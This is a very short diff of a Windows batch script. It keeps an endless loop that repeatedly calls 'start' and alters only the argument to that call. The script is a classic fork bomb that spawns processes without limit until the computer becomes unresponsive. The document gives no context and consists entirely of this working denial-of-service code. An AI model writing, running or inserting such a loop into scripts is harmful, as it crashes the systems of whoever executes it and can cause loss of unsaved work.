@@ -1,4 +1,4 @@
 @echo off
 :loop
-start You
+start
 goto loop
